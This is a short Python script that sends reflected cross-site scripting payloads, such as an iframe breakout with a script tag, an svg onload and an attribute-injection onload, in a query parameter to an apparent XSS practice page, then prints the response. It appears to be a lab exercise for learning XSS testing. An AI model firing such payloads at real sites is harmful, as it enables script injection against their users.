#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

# payload = '"></iframe><script>alert(1)</script>'
# payload = '"></iframe><svg/onload=alert(1)>'
payload = '"onload="alert(1)'

params = {'p22': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
